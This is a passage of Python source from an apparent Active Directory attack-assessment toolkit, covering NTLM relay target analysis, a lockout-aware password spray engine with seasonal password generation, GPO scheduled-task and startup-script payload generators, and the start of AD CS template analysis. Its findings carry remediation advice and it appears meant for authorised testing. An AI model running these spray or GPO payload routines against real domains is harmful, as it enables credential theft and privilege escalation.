        "ADCS_HTTP": [80, 443],
    }

    # Services that are high-value relay targets
    HIGH_VALUE_TARGETS: Set[str] = {
        "ADCS", "Exchange", "SCCM", "WSUS",
        "DomainController", "MSSQL",
    }

    def __init__(self, domain: str) -> None:
        self._lock = threading.RLock()
        self._domain = domain
        self._targets: List[RelayTarget] = []
        self._findings: List[ADFinding] = []
        logger.info("NTLMRelaySimulator initialized for domain '%s'", domain)

    def find_relay_targets(
        self, hosts: List[Dict[str, Any]]
    ) -> List[RelayTarget]:
        """
        Analyze hosts for NTLM relay viability.

        Args:
            hosts: List of host dictionaries with service/signing info.

        Returns:
            List of RelayTarget objects.
        """
        with self._lock:
            self._targets.clear()
            self._findings.clear()
            start = time.time()

            for host in hosts:
                target = RelayTarget(
                    hostname=host.get("hostname", ""),
                    ip_address=host.get("ip_address", ""),
                    port=host.get("port", 445),
                    protocol=host.get("protocol", "SMB"),
                    smb_signing=host.get("smb_signing", True),
                    epa_enabled=host.get("epa_enabled", False),
                    services=host.get("services", []),
                    os_version=host.get("os_version", ""),
                    is_dc=host.get("is_dc", False),
                    is_exchange=host.get("is_exchange", False),
                    is_adcs=host.get("is_adcs", False),
                )
                target.relay_viable = self._assess_relay_viability(target)
                if target.relay_viable:
                    target.notes = self._generate_relay_notes(target)
                self._targets.append(target)

            self._generate_relay_findings()

            elapsed = time.time() - start
            logger.info(
                "Analyzed %d hosts, %d viable relay targets in %.3fs",
                len(hosts),
                sum(1 for t in self._targets if t.relay_viable),
                elapsed,
            )
            return list(self._targets)

    def get_viable_targets(self) -> List[RelayTarget]:
        """Return only viable relay targets."""
        with self._lock:
            return [t for t in self._targets if t.relay_viable]

    def get_findings(self) -> List[ADFinding]:
        """Return relay-related findings."""
        with self._lock:
            return list(self._findings)

    def check_smb_signing(self, host: Dict[str, Any]) -> Dict[str, Any]:
        """
        Analyze SMB signing configuration for a host.

        Args:
            host: Host dictionary with SMB info.

        Returns:
            SMB signing analysis result.
        """
        signing_required = host.get("smb_signing_required", False)
        signing_enabled = host.get("smb_signing_enabled", True)
        is_dc = host.get("is_dc", False)

        relayable = not signing_required
        risk = "none"
        if not signing_required and not signing_enabled:
            risk = "critical"
        elif not signing_required:
            risk = "high"

        return {
            "hostname": host.get("hostname", ""),
            "signing_required": signing_required,
            "signing_enabled": signing_enabled,
            "is_dc": is_dc,
            "relayable": relayable,
            "risk": risk,
            "note": (
                "DCs require signing by default"
                if is_dc
                else "SMB signing not required - relay viable"
                if relayable
                else "SMB signing required - relay not viable"
            ),
        }

    def check_epa(self, host: Dict[str, Any]) -> Dict[str, Any]:
        """
        Check Extended Protection for Authentication (EPA/CB) status.

        Args:
            host: Host dictionary.

        Returns:
            EPA analysis result.
        """
        epa_enabled = host.get("epa_enabled", False)
        epa_mode = host.get("epa_mode", "none")  # none, allow, require
        services_with_epa = host.get("services_with_epa", [])

        return {
            "hostname": host.get("hostname", ""),
            "epa_enabled": epa_enabled,
            "epa_mode": epa_mode,
            "services_with_epa": services_with_epa,
            "relay_mitigated": epa_mode == "require",
            "note": (
                "EPA required - NTLM relay mitigated for channel binding"
                if epa_mode == "require"
                else "EPA in allow mode - partial mitigation"
                if epa_mode == "allow"
                else "No EPA - vulnerable to cross-protocol relay"
            ),
        }

    def get_statistics(self) -> Dict[str, Any]:
        """Return relay simulation statistics."""
        with self._lock:
            total = len(self._targets)
            viable = sum(1 for t in self._targets if t.relay_viable)
            no_signing = sum(
                1 for t in self._targets if not t.smb_signing
            )
            no_epa = sum(1 for t in self._targets if not t.epa_enabled)
            adcs_targets = sum(1 for t in self._targets if t.is_adcs and t.relay_viable)
            dc_targets = sum(1 for t in self._targets if t.is_dc and t.relay_viable)
            return {
                "total_hosts": total,
                "viable_targets": viable,
                "no_smb_signing": no_signing,
                "no_epa": no_epa,
                "adcs_relay_targets": adcs_targets,
                "dc_relay_targets": dc_targets,
            }

    def _assess_relay_viability(self, target: RelayTarget) -> bool:
        """Determine if a target is viable for NTLM relay."""
        # SMB relay requires signing to be disabled
        if target.protocol == "SMB" and target.smb_signing:
            return False
        # EPA blocks cross-protocol relay
        if target.epa_enabled and target.protocol in ("HTTPS", "LDAPS"):
            return False
        # ADCS web enrollment is a prime relay target
        if target.is_adcs:
            return True
        # LDAP relay to DCs for RBCD
        if target.is_dc and target.protocol == "LDAP":
            return True
        # SMB without signing
        if target.protocol == "SMB" and not target.smb_signing:
            return True
        # HTTP without EPA
        if target.protocol in ("HTTP", "HTTPS") and not target.epa_enabled:
            return True
        return False

    def _generate_relay_notes(self, target: RelayTarget) -> str:
        """Generate human-readable notes for a relay target."""
        notes: List[str] = []
        if target.is_adcs:
            notes.append("ADCS web enrollment - ESC8 relay possible")
        if target.is_exchange:
            notes.append("Exchange server - PrivExchange/relay to LDAP")
        if target.is_dc and not target.smb_signing:
            notes.append("DC without SMB signing (unusual) - high-value relay target")
        if not target.smb_signing and target.protocol == "SMB":
            notes.append("SMB signing not required - standard relay")
        if not target.epa_enabled:
            notes.append("No EPA - cross-protocol relay possible")
        return "; ".join(notes) if notes else "Standard relay target"

    def _generate_relay_findings(self) -> None:
        """Generate findings from relay analysis."""
        viable = [t for t in self._targets if t.relay_viable]
        if not viable:
            return

        no_signing = [
            t for t in self._targets
            if not t.smb_signing and t.protocol == "SMB"
        ]
        if no_signing:
            self._findings.append(ADFinding(
                title=f"{len(no_signing)} hosts have SMB signing disabled",
                description=(
                    f"{len(no_signing)} hosts do not require SMB signing, making them "
                    f"vulnerable to NTLM relay attacks via SMB."
                ),
                severity=FindingSeverity.HIGH,
                phase=AttackPhase.LATERAL_MOVEMENT,
                affected_objects=[t.hostname for t in no_signing[:20]],
                evidence={
                    "count": len(no_signing),
                    "hosts": [t.hostname for t in no_signing[:50]],
                },
                mitre_technique="T1557.001",
                remediation="Enable and require SMB signing on all systems via GPO.",
                confidence=0.95,
                tags=["ntlm-relay", "smb-signing"],
            ))

        adcs_targets = [t for t in viable if t.is_adcs]
        if adcs_targets:
            self._findings.append(ADFinding(
                title=f"{len(adcs_targets)} ADCS servers are relay targets (ESC8)",
                description=(
                    f"{len(adcs_targets)} AD Certificate Services servers accept "
                    f"NTLM authentication on web enrollment without EPA, enabling "
                    f"ESC8 relay attacks for certificate theft."
                ),
                severity=FindingSeverity.CRITICAL,
                phase=AttackPhase.PRIVILEGE_ESCALATION,
                affected_objects=[t.hostname for t in adcs_targets],
                evidence={
                    "adcs_hosts": [
                        {"hostname": t.hostname, "port": t.port}
                        for t in adcs_targets
                    ],
                },
                mitre_technique="T1557.001",
                remediation="Enable EPA on ADCS web enrollment; disable NTLM on IIS; use HTTPS only.",
                confidence=0.97,
                tags=["ntlm-relay", "adcs", "esc8"],
            ))


# ════════════════════════════════════════════════════════════════════════════════
# PASSWORD SPRAY ENGINE
# ════════════════════════════════════════════════════════════════════════════════

class PasswordSprayEngine:
    """
    Smart password spraying simulation engine.

    Lockout-aware with smart timing, seasonal password patterns,
    and username format detection.

    Usage:
        engine = PasswordSprayEngine("corp.local", lockout_threshold=5)
        passwords = engine.generate_seasonal_passwords(2026)
        results = engine.spray(usernames, passwords)
    """

    # Common username formats
    USERNAME_FORMATS: Dict[str, str] = {
        "first.last": "{first}.{last}",
        "flast": "{f}{last}",
        "firstl": "{first}{l}",
        "first_last": "{first}_{last}",
        "last.first": "{last}.{first}",
        "first": "{first}",
        "f.last": "{f}.{last}",
        "lastf": "{last}{f}",
    }

    # Seasonal base words by season
    SEASONAL_WORDS: Dict[str, List[str]] = {
        "Spring": [
            "Spring", "Easter", "March", "April", "May",
            "Flowers", "Rain", "Bloom", "Garden", "Renewal",
        ],
        "Summer": [
            "Summer", "Beach", "June", "July", "August",
            "Vacation", "Sunshine", "Holiday", "Sun", "Heat",
        ],
        "Fall": [
            "Fall", "Autumn", "September", "October", "November",
            "Halloween", "Harvest", "Pumpkin", "Turkey", "Thanks",
        ],
        "Winter": [
            "Winter", "Christmas", "December", "January", "February",
            "Snow", "Holiday", "Xmas", "NewYear", "Freeze",
        ],
    }

    # Common password patterns
    COMMON_PATTERNS: List[str] = [
        "Password", "Welcome", "Changeme", "Company",
        "P@ssw0rd", "Qwerty", "Admin", "Letmein",
        "Monkey", "Dragon", "Master", "Login",
        "Access", "Trustno1", "Shadow", "Michael",
    ]

    # Common suffixes
    COMMON_SUFFIXES: List[str] = [
        "!", "@", "#", "$", "1", "12", "123", "1234",
        "!!", "1!", "01", "2024", "2025", "2026",
        "@1", "#1", "$1",
    ]

    # Kerberos error codes
    KRB_ERRORS: Dict[str, str] = {
        "KDC_ERR_PREAUTH_FAILED": "Invalid credentials",
        "KDC_ERR_CLIENT_REVOKED": "Account disabled or locked",
        "KDC_ERR_KEY_EXPIRED": "Password expired",
        "KDC_ERR_C_PRINCIPAL_UNKNOWN": "User does not exist",
        "KDC_ERR_POLICY": "Account locked out",
    }

    def __init__(
        self,
        domain: str,
        lockout_threshold: int = 5,
        lockout_duration_minutes: int = 30,
        observation_window_minutes: int = 30,
        strategy: SprayStrategy = SprayStrategy.MODERATE,
    ) -> None:
        self._lock = threading.RLock()
        self._domain = domain
        self._lockout_threshold = lockout_threshold
        self._lockout_duration = lockout_duration_minutes * 60
        self._observation_window = observation_window_minutes * 60
        self._strategy = strategy
        self._results: List[SprayResult] = []
        self._findings: List[ADFinding] = []
        self._attempt_tracker: Dict[str, List[float]] = defaultdict(list)
        self._locked_accounts: Set[str] = set()
        self._detected_format: Optional[str] = None
        logger.info(
            "PasswordSprayEngine initialized: domain='%s', lockout=%d/%dmin, strategy=%s",
            domain, lockout_threshold, lockout_duration_minutes, strategy.name,
        )

    def generate_seasonal_passwords(
        self, year: int, include_common: bool = True
    ) -> List[str]:
        """
        Generate seasonal password candidates (Season+Year pattern).

        Args:
            year: Target year for passwords.
            include_common: Whether to include common non-seasonal passwords.

        Returns:
            Ordered list of password candidates.
        """
        passwords: List[str] = []
        seen: Set[str] = set()

        # Determine current season based on simulated month
        month = int(time.strftime("%m"))
        if month in (3, 4, 5):
            current_season = "Spring"
        elif month in (6, 7, 8):
            current_season = "Summer"
        elif month in (9, 10, 11):
            current_season = "Fall"
        else:
            current_season = "Winter"

        # Prioritize current and previous season
        season_order = list(self.SEASONAL_WORDS.keys())
        idx = season_order.index(current_season)
        ordered = [season_order[idx], season_order[(idx - 1) % 4]]
        for s in season_order:
            if s not in ordered:
                ordered.append(s)

        year_variants = [str(year), str(year)[-2:], str(year - 1), str(year - 1)[-2:]]

        for season in ordered:
            words = self.SEASONAL_WORDS[season]
            for word in words:
                for yr in year_variants:
                    # SeasonYear patterns
                    candidates = [
                        f"{word}{yr}",
                        f"{word}{yr}!",
                        f"{word}{yr}@",
                        f"{word}{yr}#",
                        f"{word}@{yr}",
                        f"{word}#{yr}",
                        f"{word}_{yr}",
                        f"{word.lower()}{yr}",
                        f"{word.lower()}{yr}!",
                        f"{word.upper()}{yr}",
                        f"{word.capitalize()}{yr}!",
                    ]
                    for c in candidates:
                        if c not in seen and len(c) >= 8:
                            seen.add(c)
                            passwords.append(c)

        if include_common:
            for pattern in self.COMMON_PATTERNS:
                for suffix in self.COMMON_SUFFIXES:
                    c = f"{pattern}{suffix}"
                    if c not in seen and len(c) >= 8:
                        seen.add(c)
                        passwords.append(c)
                # Also with year
                for yr in year_variants[:2]:
                    for sfx in ["", "!", "@", "#"]:
                        c = f"{pattern}{yr}{sfx}"
                        if c not in seen and len(c) >= 8:
                            seen.add(c)
                            passwords.append(c)

        logger.info("Generated %d seasonal password candidates for year %d", len(passwords), year)
        return passwords

    def detect_username_format(
        self, usernames: List[str]
    ) -> Optional[str]:
        """
        Detect the username naming convention from a sample.

        Args:
            usernames: Sample of usernames to analyze.

        Returns:
            Detected format name or None.
        """
        with self._lock:
            if not usernames:
                return None

            scores: Dict[str, int] = defaultdict(int)

            for uname in usernames:
                uname_lower = uname.lower().strip()
                if not uname_lower:
                    continue
                # first.last
                if re.match(r"^[a-z]{2,}\.{1}[a-z]{2,}$", uname_lower):
                    scores["first.last"] += 1
                # flast
                if re.match(r"^[a-z]{1}[a-z]{2,}$", uname_lower) and len(uname_lower) <= 12:
                    scores["flast"] += 1
                # firstl
                if re.match(r"^[a-z]{2,}[a-z]{1}$", uname_lower) and len(uname_lower) <= 12:
                    scores["firstl"] += 1
                # first_last
                if re.match(r"^[a-z]{2,}_{1}[a-z]{2,}$", uname_lower):
                    scores["first_last"] += 1
                # last.first
                if re.match(r"^[a-z]{2,}\.{1}[a-z]{2,}$", uname_lower):
                    scores["last.first"] += 1
                # f.last
                if re.match(r"^[a-z]{1}\.{1}[a-z]{2,}$", uname_lower):
                    scores["f.last"] += 1

            if not scores:
                self._detected_format = None
                return None

            best = max(scores, key=lambda k: scores[k])
            self._detected_format = best
            logger.info(
                "Detected username format: '%s' (score=%d/%d)",
                best, scores[best], len(usernames),
            )
            return best

    def spray(
        self,
        usernames: List[str],
        passwords: List[str],
        auth_func: Optional[Callable[[str, str, str], Dict[str, Any]]] = None,
    ) -> List[SprayResult]:
        """
        Execute a password spray with lockout-aware timing.

        Args:
            usernames: Target usernames.
            passwords: Password candidates (sprayed one at a time).
            auth_func: Optional authentication function(user, password, domain) -> result dict.

        Returns:
            List of SprayResult objects.
        """
        with self._lock:
            self._results.clear()
            self._findings.clear()
            start = time.time()

            delay = self._calculate_delay()
            safe_attempts = max(1, self._lockout_threshold - 2) if self._lockout_threshold > 0 else len(passwords)

            logger.info(
                "Starting spray: %d users x %d passwords, delay=%.1fs, safe_attempts=%d",
                len(usernames), len(passwords), delay, safe_attempts,
            )

            attempts_per_window: Dict[str, int] = defaultdict(int)
            successes: List[SprayResult] = []

            for pwd_idx, password in enumerate(passwords):
                # Check if we need to wait for observation window
                if self._lockout_threshold > 0 and pwd_idx > 0 and pwd_idx % safe_attempts == 0:
                    wait_time = self._observation_window
                    logger.info(
                        "Lockout safety pause: waiting %d seconds after %d attempts per user",
                        wait_time, safe_attempts,
                    )
                    # In simulation we don't actually sleep, just track time
                    for user in usernames:
                        self._attempt_tracker[user].clear()

                for username in usernames:
                    if username in self._locked_accounts:
                        continue

                    # Check attempt count in observation window
                    now = time.time()
                    recent = [
                        t for t in self._attempt_tracker[username]
                        if now - t < self._observation_window
                    ]
                    self._attempt_tracker[username] = recent

                    if (self._lockout_threshold > 0
                            and len(recent) >= safe_attempts):
                        continue

                    # Execute authentication attempt
                    result = self._attempt_auth(
                        username, password, auth_func
                    )
                    self._results.append(result)
                    self._attempt_tracker[username].append(time.time())

                    if result.success:
                        successes.append(result)
                        logger.info(
                            "Valid credential found: %s:%s",
                            username, password,
                        )
                    elif result.locked_out:
                        self._locked_accounts.add(username)
                        logger.warning(
                            "Account locked out: %s", username,
                        )

            self._generate_spray_findings(successes)

            elapsed = time.time() - start
            logger.info(
                "Spray complete: %d attempts, %d successes, %d lockouts in %.3fs",
                len(self._results),
                len(successes),
                len(self._locked_accounts),
                elapsed,
            )
            return list(self._results)

    def get_findings(self) -> List[ADFinding]:
        """Return password spray findings."""
        with self._lock:
            return list(self._findings)

    def get_successes(self) -> List[SprayResult]:
        """Return successful spray results."""
        with self._lock:
            return [r for r in self._results if r.success]

    def get_statistics(self) -> Dict[str, Any]:
        """Return spray statistics."""
        with self._lock:
            total = len(self._results)
            successes = sum(1 for r in self._results if r.success)
            lockouts = len(self._locked_accounts)
            unique_users = len({r.username for r in self._results})
            unique_passwords = len({r.password for r in self._results})
            return {
                "total_attempts": total,
                "successes": successes,
                "lockouts": lockouts,
                "unique_users_targeted": unique_users,
                "unique_passwords_tried": unique_passwords,
                "success_rate": successes / total if total > 0 else 0.0,
                "strategy": self._strategy.name,
                "detected_format": self._detected_format,
            }

    def _calculate_delay(self) -> float:
        """Calculate delay between spray attempts based on strategy."""
        delays: Dict[SprayStrategy, float] = {
            SprayStrategy.STEALTH: 60.0,
            SprayStrategy.CONSERVATIVE: 30.0,
            SprayStrategy.MODERATE: 5.0,
            SprayStrategy.AGGRESSIVE: 0.5,
        }
        return delays.get(self._strategy, 5.0)

    def _attempt_auth(
        self,
        username: str,
        password: str,
        auth_func: Optional[Callable[[str, str, str], Dict[str, Any]]],
    ) -> SprayResult:
        """Execute a single authentication attempt."""
        start = time.time()

        if auth_func is not None:
            try:
                result_data = auth_func(username, password, self._domain)
                elapsed_ms = (time.time() - start) * 1000
                return SprayResult(
                    username=username,
                    password=password,
                    success=result_data.get("success", False),
                    locked_out=result_data.get("locked_out", False),
                    error_code=result_data.get("error_code", ""),
                    error_message=result_data.get("error_message", ""),
                    response_time_ms=elapsed_ms,
                )
            except Exception as exc:
                elapsed_ms = (time.time() - start) * 1000
                return SprayResult(
                    username=username,
                    password=password,
                    success=False,
                    error_code="AUTH_ERROR",
                    error_message=str(exc),
                    response_time_ms=elapsed_ms,
                )

        # Simulation mode: deterministic based on hash
        seed = hashlib.md5(
            f"{username}:{password}:{self._domain}".encode()
        ).hexdigest()
        sim_value = int(seed[:8], 16) % 1000
        elapsed_ms = (time.time() - start) * 1000

        # ~2% success rate in simulation
        success = sim_value < 20
        # ~0.1% lockout in simulation
        locked = sim_value >= 999

        error_code = ""
        error_msg = ""
        if not success:
            if locked:
                error_code = "KDC_ERR_POLICY"
                error_msg = self.KRB_ERRORS.get(error_code, "")
            else:
                error_code = "KDC_ERR_PREAUTH_FAILED"
                error_msg = self.KRB_ERRORS.get(error_code, "")

        return SprayResult(
            username=username,
            password=password,
            success=success,
            locked_out=locked,
            error_code=error_code,
            error_message=error_msg,
            response_time_ms=elapsed_ms,
        )

    def _generate_spray_findings(self, successes: List[SprayResult]) -> None:
        """Generate findings from spray results."""
        if successes:
            # Group by password
            pwd_users: Dict[str, List[str]] = defaultdict(list)
            for s in successes:
                pwd_users[s.password].append(s.username)

            self._findings.append(ADFinding(
                title=f"Password spray found {len(successes)} valid credentials",
                description=(
                    f"Password spraying discovered {len(successes)} valid username/password "
                    f"combinations across {len(pwd_users)} passwords."
                ),
                severity=FindingSeverity.CRITICAL,
                phase=AttackPhase.CREDENTIAL_HARVEST,
                affected_objects=[s.username for s in successes],
                evidence={
                    "credential_count": len(successes),
                    "passwords_matched": {
                        pwd: users for pwd, users in pwd_users.items()
                    },
                },
                mitre_technique="T1110.003",
                remediation="Enforce strong password policy; implement MFA; ban common passwords.",
                confidence=0.99,
                tags=["password-spray", "weak-credentials"],
            ))

            # Check for seasonal patterns
            seasonal_matches = []
            for pwd in pwd_users:
                for season_words in self.SEASONAL_WORDS.values():
                    for word in season_words:
                        if word.lower() in pwd.lower():
                            seasonal_matches.append(pwd)
                            break

            if seasonal_matches:
                self._findings.append(ADFinding(
                    title=f"{len(seasonal_matches)} passwords match seasonal patterns",
                    description=(
                        f"Passwords matching Season+Year or month-based patterns were found: "
                        f"{', '.join(seasonal_matches[:5])}. Users are likely choosing "
                        f"predictable passwords based on the time of year."
                    ),
                    severity=FindingSeverity.HIGH,
                    phase=AttackPhase.CREDENTIAL_HARVEST,
                    affected_objects=[
                        u for pwd in seasonal_matches for u in pwd_users.get(pwd, [])
                    ],
                    evidence={"seasonal_passwords": seasonal_matches},
                    mitre_technique="T1110.003",
                    remediation="Ban seasonal/temporal words in password filter; enforce passphrase policy.",
                    confidence=0.92,
                    tags=["password-spray", "seasonal-pattern"],
                ))


# ════════════════════════════════════════════════════════════════════════════════
# GPO ABUSER
# ════════════════════════════════════════════════════════════════════════════════

class GPOAbuser:
    """
    GPO abuse detection and exploitation simulation.

    Detects writable GPOs and simulates scheduled task injection,
    script deployment, and MSI installation abuse.

    Usage:
        abuser = GPOAbuser("corp.local")
        writable = abuser.find_writable_gpos(gpo_data, user_sids)
        payloads = abuser.generate_scheduled_task_payload("cmd.exe /c whoami")
    """

    # GPO paths that can be abused
    ABUSABLE_GPO_PATHS: Dict[str, str] = {
        "scheduled_tasks": r"Machine\Preferences\ScheduledTasks\ScheduledTasks.xml",
        "immediate_tasks": r"Machine\Preferences\ScheduledTasks\ScheduledTasks.xml",
        "scripts_startup": r"Machine\Scripts\Startup",
        "scripts_shutdown": r"Machine\Scripts\Shutdown",
        "scripts_logon": r"User\Scripts\Logon",
        "scripts_logoff": r"User\Scripts\Logoff",
        "msi_install": r"Machine\Preferences\MSI",
        "registry": r"Machine\Preferences\Registry\Registry.xml",
        "services": r"Machine\Preferences\Services\Services.xml",
        "files": r"Machine\Preferences\Files\Files.xml",
        "folders": r"Machine\Preferences\Folders\Folders.xml",
        "ini_files": r"Machine\Preferences\INI\INIFiles.xml",
        "local_users": r"Machine\Preferences\Groups\Groups.xml",
    }

    # ACE masks that indicate write access
    WRITE_MASKS: Dict[str, int] = {
        "GENERIC_ALL": 0x10000000,
        "GENERIC_WRITE": 0x40000000,
        "WRITE_DACL": 0x00040000,
        "WRITE_OWNER": 0x00080000,
        "WRITE_PROPERTY": 0x00000020,
        "FILE_WRITE_DATA": 0x00000002,
        "FILE_APPEND_DATA": 0x00000004,
    }

    def __init__(self, domain: str) -> None:
        self._lock = threading.RLock()
        self._domain = domain
        self._writable_gpos: List[GPOInfo] = []
        self._findings: List[ADFinding] = []
        logger.info("GPOAbuser initialized for domain '%s'", domain)

    def find_writable_gpos(
        self,
        gpo_data: List[Dict[str, Any]],
        controlled_sids: Set[str],
    ) -> List[GPOInfo]:
        """
        Find GPOs writable by the specified principals.

        Args:
            gpo_data: List of GPO dictionaries with permission info.
            controlled_sids: SIDs of controlled principals.

        Returns:
            List of writable GPOInfo objects.
        """
        with self._lock:
            self._writable_gpos.clear()
            self._findings.clear()
            start = time.time()

            for gpo_dict in gpo_data:
                gpo = GPOInfo(
                    gpo_id=gpo_dict.get("gpo_id", ""),
                    display_name=gpo_dict.get("display_name", ""),
                    gpo_dn=gpo_dict.get("gpo_dn", ""),
                    gpc_path=gpo_dict.get("gpc_path", ""),
                    linked_ous=gpo_dict.get("linked_ous", []),
                    owner=gpo_dict.get("owner", ""),
                    permissions=gpo_dict.get("permissions", []),
                    version_user=gpo_dict.get("version_user", 0),
                    version_computer=gpo_dict.get("version_computer", 0),
                    created=gpo_dict.get("created", 0.0),
                    modified=gpo_dict.get("modified", 0.0),
                )

                # Check permissions for write access
                writable_by: List[str] = []
                for perm in gpo.permissions:
                    sid = perm.get("sid", "")
                    mask = perm.get("access_mask", 0)
                    perm_type = perm.get("type", "")

                    if "DENY" in perm_type.upper():
                        continue

                    has_write = False
                    for write_name, write_mask in self.WRITE_MASKS.items():
                        if mask & write_mask:
                            has_write = True
                            break

                    if has_write and sid in controlled_sids:
                        writable_by.append(sid)

                # Check if owner is controlled
                if gpo.owner in controlled_sids:
                    writable_by.append(f"{gpo.owner} (owner)")

                if writable_by:
                    gpo.writable_by = writable_by
                    self._writable_gpos.append(gpo)

            self._generate_gpo_findings()

            elapsed = time.time() - start
            logger.info(
                "Found %d writable GPOs in %.3fs",
                len(self._writable_gpos), elapsed,
            )
            return list(self._writable_gpos)

    def generate_scheduled_task_payload(
        self,
        command: str,
        task_name: str = "WindowsUpdate",
        run_as: str = "NT AUTHORITY\\SYSTEM",
        trigger: str = "immediate",
    ) -> Dict[str, Any]:
        """
        Generate a GPO scheduled task injection payload.

        Args:
            command: Command to execute.
            task_name: Display name for the scheduled task.
            run_as: Account to run the task as.
            trigger: Trigger type (immediate, logon, startup).

        Returns:
            Payload dictionary with XML and deployment info.
        """
        task_uid = f"{{{uuid.uuid4()!s}}}"
        clsid_imm = "{756FD199-21AD-4688-836F-D18E0B1A5A43}"
        clsid_task = "{CC63350A-727F-4AE1-A5A0-1D3B1F1B4975}"

        trigger_map = {
            "immediate": "ImmediateTask",
            "logon": "LogonTrigger",
            "startup": "BootTrigger",
        }
        trigger_type = trigger_map.get(trigger, "ImmediateTask")

        # Parse command and arguments
        parts = command.split(" ", 1)
        exe = parts[0]
        args = parts[1] if len(parts) > 1 else ""

        xml_content = (
            '<?xml version="1.0" encoding="utf-8"?>\n'
            '<ScheduledTasks clsid="{CC63350A-727F-4AE1-A5A0-1D3B1F1B4975}">\n'
            f'  <{trigger_type} clsid="{clsid_imm}" name="{task_name}" '
            f'image="0" changed="" uid="{task_uid}">\n'
            '    <Properties action="C" name="{name}" runAs="{run_as}" '
            'logonType="S4U">\n'
            '      <Task version="1.2">\n'
            '        <Principals>\n'
            f'          <Principal id="Author" runLevel="HighestAvailable">\n'
            f'            <UserId>{run_as}</UserId>\n'
            '            <LogonType>S4U</LogonType>\n'
            '          </Principal>\n'
            '        </Principals>\n'
            '        <Actions>\n'
            f'          <Exec>\n'
            f'            <Command>{exe}</Command>\n'
            f'            <Arguments>{args}</Arguments>\n'
            '          </Exec>\n'
            '        </Actions>\n'
            '      </Task>\n'
            '    </Properties>\n'
            f'  </{trigger_type}>\n'
            '</ScheduledTasks>'
        ).format(name=task_name, run_as=run_as)

        return {
            "type": "scheduled_task",
            "task_name": task_name,
            "command": command,
            "run_as": run_as,
            "trigger": trigger,
            "xml_content": xml_content,
            "deploy_path": self.ABUSABLE_GPO_PATHS["scheduled_tasks"],
            "task_uid": task_uid,
            "description": (
                f"Immediate scheduled task '{task_name}' executing '{command}' "
                f"as {run_as} via GPO preference."
            ),
        }

    def generate_script_payload(
        self,
        script_content: str,
        script_type: str = "startup",
        script_name: str = "update.bat",
    ) -> Dict[str, Any]:
        """
        Generate a GPO startup/logon script injection payload.

        Args:
            script_content: Script content to deploy.
            script_type: Type of script (startup, shutdown, logon, logoff).
            script_name: Filename for the script.

        Returns:
            Payload dictionary.
        """
        path_key = f"scripts_{script_type}"
        deploy_path = self.ABUSABLE_GPO_PATHS.get(
            path_key, self.ABUSABLE_GPO_PATHS["scripts_startup"]
        )

        ini_content = (
            f"[{script_type.capitalize()}]\n"
            f"0CmdLine={script_name}\n"
            "0Parameters=\n"
        )

        return {
            "type": "script",
            "script_type": script_type,
            "script_name": script_name,
            "script_content": script_content,
            "ini_content": ini_content,
            "deploy_path": deploy_path,
            "description": (
                f"GPO {script_type} script '{script_name}' deploying to "
                f"all computers/users linked to the GPO."
            ),
        }

    def get_findings(self) -> List[ADFinding]:
        """Return GPO abuse findings."""
        with self._lock:
            return list(self._findings)

    def _generate_gpo_findings(self) -> None:
        """Generate findings from writable GPO analysis."""
        if not self._writable_gpos:
            return

        # GPOs linked to privileged OUs are highest risk
        high_impact_gpos = [
            g for g in self._writable_gpos
            if any(
                "domain controllers" in ou.lower()
                or "domain root" in ou.lower()
                for ou in g.linked_ous
            )
        ]

        self._findings.append(ADFinding(
            title=f"{len(self._writable_gpos)} GPOs are writable by controlled principals",
            description=(
                f"Controlled principals can modify {len(self._writable_gpos)} GPOs. "
                f"This allows deploying scheduled tasks, scripts, or MSI packages "
                f"to all computers and users in linked OUs."
            ),
            severity=FindingSeverity.CRITICAL if high_impact_gpos else FindingSeverity.HIGH,
            phase=AttackPhase.PRIVILEGE_ESCALATION,
            affected_objects=[g.display_name for g in self._writable_gpos],
            evidence={
                "writable_count": len(self._writable_gpos),
                "high_impact": [g.display_name for g in high_impact_gpos],
                "gpo_details": [g.to_dict() for g in self._writable_gpos[:10]],
            },
            mitre_technique="T1484.001",
            remediation="Audit GPO permissions; remove unnecessary write access; monitor GPO changes.",
            confidence=0.95,
            tags=["gpo-abuse", "privilege-escalation"],
        ))


# ════════════════════════════════════════════════════════════════════════════════
# CERTIFICATE ABUSER (AD CS)
# ════════════════════════════════════════════════════════════════════════════════

class CertificateAbuser:
    """
    AD Certificate Services abuse detection engine.

    Identifies ESC1 through ESC8 escalation paths in ADCS configurations.

    Usage:
        abuser = CertificateAbuser("corp.local")
        vulns = abuser.analyze_templates(templates, cas)
        esc_paths = abuser.get_esc_paths()
    """

    # ESC descriptions
    ESC_DESCRIPTIONS: Dict[ESCType, str] = {
        ESCType.ESC1: "Template allows requestor to specify SAN (Subject Alternative Name)",
        ESCType.ESC2: "Template allows any purpose or is subordinate CA",
        ESCType.ESC3: "Template allows enrollment agent and another template allows on-behalf-of",
        ESCType.ESC4: "Template has vulnerable ACLs allowing modification",
        ESCType.ESC5: "CA object has vulnerable ACLs",
        ESCType.ESC6: "EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled on CA (arbitrary SAN)",
        ESCType.ESC7: "CA has ManageCA or ManageCertificates for low-priv user",
        ESCType.ESC8: "NTLM relay to ADCS web enrollment (HTTP endpoint)",
    }

    # ESC severity ratings
    ESC_SEVERITY: Dict[ESCType, FindingSeverity] = {
        ESCType.ESC1: FindingSeverity.CRITICAL,
        ESCType.ESC2: FindingSeverity.HIGH,
        ESCType.ESC3: FindingSeverity.HIGH,
        ESCType.ESC4: FindingSeverity.CRITICAL,
        ESCType.ESC5: FindingSeverity.HIGH,
        ESCType.ESC6: FindingSeverity.CRITICAL,
        ESCType.ESC7: FindingSeverity.HIGH,
        ESCType.ESC8: FindingSeverity.CRITICAL,
    }

    # OID for Client Authentication
    CLIENT_AUTH_OID: str = "1.3.6.1.5.5.7.3.2"
    ANY_PURPOSE_OID: str = "2.5.29.37.0"
    SUB_CA_OID: str = "2.5.29.37.0"

    def __init__(self, domain: str) -> None:
        self._lock = threading.RLock()
        self._domain = domain
        self._templates: List[CertTemplate] = []
        self._esc_paths: List[Dict[str, Any]] = []
        self._findings: List[ADFinding] = []
        logger.info("CertificateAbuser initialized for domain '%s'", domain)

    def analyze_templates(
        self,
        templates: List[Dict[str, Any]],
        ca_info: List[Dict[str, Any]],
        controlled_sids: Optional[Set[str]] = None,
    ) -> List[Dict[str, Any]]:
        """
        Analyze certificate templates for ESC1-ESC8 paths.

        Args:
            templates: List of certificate template dictionaries.
            ca_info: List of CA server dictionaries.
            controlled_sids: SIDs of controlled principals.

        Returns:
            List of identified ESC path dictionaries.
        """
        with self._lock:
            self._templates.clear()
            self._esc_paths.clear()
